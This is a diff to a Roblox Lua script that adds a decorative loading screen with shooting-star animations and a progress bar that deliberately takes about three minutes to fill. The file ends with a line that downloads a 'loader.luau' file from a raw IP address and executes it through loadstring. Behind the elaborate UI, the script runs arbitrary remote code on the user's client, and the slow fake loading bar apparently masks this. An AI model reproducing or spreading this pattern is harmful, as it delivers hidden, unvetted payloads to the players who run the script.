@@ -1,2 +1,191 @@
+-- Services
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "StarryLoadingUI"
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.Parent = PlayerGui
+
+-- Container (janela centralizada)
+local container = Instance.new("Frame")
+container.Size = UDim2.new(0, 600, 0, 300)
+container.Position = UDim2.new(0.5, 0, 0.5, 0) -- CORREÇÃO: Posição centralizada
+container.AnchorPoint = Vector2.new(0.5, 0.5) -- AnchorPoint no centro
+container.BackgroundColor3 = Color3.fromRGB(10, 10, 25)
+container.BorderSizePixel = 0
+container.ClipsDescendants = true -- IMPORTANT: faz com que tudo fora fique invisível
+container.Parent = screenGui
+
+local containerCorner = Instance.new("UICorner")
+containerCorner.CornerRadius = UDim.new(0, 18)
+containerCorner.Parent = container
+
+-- Título / texto
+local loadingText = Instance.new("TextLabel")
+loadingText.Size = UDim2.new(1, 0, 0.18, 0)
+loadingText.Position = UDim2.new(0, 0, 0.06, 0)
+loadingText.BackgroundTransparency = 1
+loadingText.Text = "✨ Carregando o universo..."
+loadingText.Font = Enum.Font.GothamBold
+loadingText.TextSize = 26
+loadingText.TextColor3 = Color3.fromRGB(235, 235, 245)
+loadingText.TextStrokeTransparency = 0.8
+loadingText.Parent = container
+
+-- Barra de fundo (arredondada)
+local barBackground = Instance.new("Frame")
+barBackground.Size = UDim2.new(0.8, 0, 0.12, 0)
+barBackground.Position = UDim2.new(0.1, 0, 0.68, 0)
+barBackground.BackgroundColor3 = Color3.fromRGB(38, 40, 58)
+barBackground.BorderSizePixel = 0
+barBackground.Parent = container
+
+local barBgCorner = Instance.new("UICorner")
+barBgCorner.CornerRadius = UDim.new(1, 0)
+barBgCorner.Parent = barBackground
+
+-- Barra de progresso (começa vazia)
+local progressBar = Instance.new("Frame")
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+progressBar.Position = UDim2.new(0, 0, 0, 0)
+progressBar.BackgroundColor3 = Color3.fromRGB(0, 200, 160)
+progressBar.BorderSizePixel = 0
+progressBar.Parent = barBackground
+
+local progressCorner = Instance.new("UICorner")
+progressCorner.CornerRadius = UDim.new(1, 0)
+progressCorner.Parent = progressBar
+
+-- Brilho/contorno da barra
+local glow = Instance.new("UIStroke")
+glow.Thickness = 2
+glow.Transparency = 0.4
+glow.Color = Color3.fromRGB(120, 255, 220)
+glow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+glow.Parent = progressBar
+
+-- Função para criar uma estrela com rastro
+local function createStar()
+    -- posições iniciam FORA do container (y acima), usando escala: x em [-0.3, 1.3] para cobrir larguras além dos lados
+    local startX = math.random(-30, 130) / 100
+    local startY = -0.22 -- inicia acima (invisível por causa do ClipsDescendants)
+    local startPos = UDim2.new(startX, 0, startY, 0)
+
+    -- delta de movimento (sempre diagonal para baixo-direita)
+    local deltaX = 0.9 -- quanto percorre na escala X
+    local deltaY = 1.1 -- quanto percorre na escala Y
+    local duration = math.random(3, 6) -- tempo que leva para cruzar a janela
+
+    -- Tail (rastro): um retângulo longo com gradiente suave
+    local tail = Instance.new("Frame")
+    tail.Size = UDim2.new(0, math.random(40, 70), 0, math.random(2, 3))
+    tail.Position = startPos
+    tail.AnchorPoint = Vector2.new(0.5, 0.5)
+    tail.BackgroundTransparency = 1
+    tail.BorderSizePixel = 0
+    tail.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    tail.ZIndex = 1
+    tail.Parent = container
+
+    -- rotaciona para alinhar com diagonal (45 graus)
+    tail.Rotation = 45
+
+    -- UIGradient para fazer a listra suave (do opaco para transparente)
+    local grad = Instance.new("UIGradient")
+    grad.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.new(1, 1, 1)),
+        ColorSequenceKeypoint.new(0.6, Color3.new(1, 1, 1)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
+    })
+    grad.Transparency = NumberSequence.new({
+        NumberSequenceKeypoint.new(0, 1), -- ponta inicial invisível (atrás)
+        NumberSequenceKeypoint.new(0.15, 0), -- corpo opaco
+        NumberSequenceKeypoint.new(1, 1) -- ponta final some
+    })
+    grad.Rotation = 0
+    grad.Parent = tail
+
+    -- Head (ponto brilhante da estrela)
+    local head = Instance.new("Frame")
+    head.Size = UDim2.new(0, 2, 0, 2)
+    head.Position = startPos
+    head.AnchorPoint = Vector2.new(0.5, 0.5)
+    head.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    head.BorderSizePixel = 0
+    head.ZIndex = 2
+    head.Parent = container
+
+    local headCorner = Instance.new("UICorner")
+    headCorner.CornerRadius = UDim.new(1, 0)
+    headCorner.Parent = head
+
+    -- Tween both tail and head together to the end position
+    local endPos = UDim2.new(startX + deltaX, 0, startY + deltaY, 0)
+
+    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
+
+    local t1 = TweenService:Create(head, tweenInfo, { Position = endPos, BackgroundTransparency = 1 })
+    local t2 = TweenService:Create(tail, tweenInfo, { Position = endPos, BackgroundTransparency = 1 })
+
+    t1:Play()
+    t2:Play()
+
+    -- cleanup quando terminar
+    t1.Completed:Connect(function()
+        pcall(function()
+            head:Destroy()
+            tail:Destroy()
+        end)
+    end)
+end
+
+-- Loop contínuo de geração de estrelas (aparecem fora, cruzam a janela e somem)
+task.spawn(function()
+    while screenGui.Parent do
+        createStar()
+        -- ajustar frequência: menor valor => mais estrelas simultâneas
+        task.wait(0.12 + math.random() * 0.06)
+    end
+end)
+
+-- Sistema de carregamento: 25% em 1s, depois 75% em 180s
+local function animateLoading()
+    -- etapa 1: 25% em 1 segundo
+    local firstTarget = 0.25
+    local tFirst = TweenService:Create(progressBar, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Size = UDim2.new(firstTarget, 0, 1, 0) })
+    tFirst:Play()
+
+    tFirst.Completed:Wait()
+
+    -- etapa 2: restante 75% em 180 segundos
+    local secondTarget = 1
+    local remainingDuration = 180 -- segundos
+    local tSecond = TweenService:Create(progressBar, TweenInfo.new(remainingDuration, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), { Size = UDim2.new(secondTarget, 0, 1, 0) })
+    tSecond:Play()
+
+    -- (opcional) sutil efeito de brilho que pulsa durante o carregamento
+    local pulseTweenInfo = TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
+    local pulseProps = { BackgroundColor3 = Color3.fromRGB(50, 255, 200) }
+    local pulse = TweenService:Create(progressBar, pulseTweenInfo, pulseProps)
+    pulse:Play()
+
+    tSecond.Completed:Wait()
+    pulse:Cancel()
+
+    -- fade out final
+    local fade = TweenService:Create(container, TweenInfo.new(1.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundTransparency = 1 })
+    fade:Play()
+    task.wait(1.2)
+    screenGui:Destroy()
+end
+
+-- start loading animation
+task.spawn(animateLoading)
+
 ID="d98f46c5-df0d-4ba3-9db0-61244be7c8e6";
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
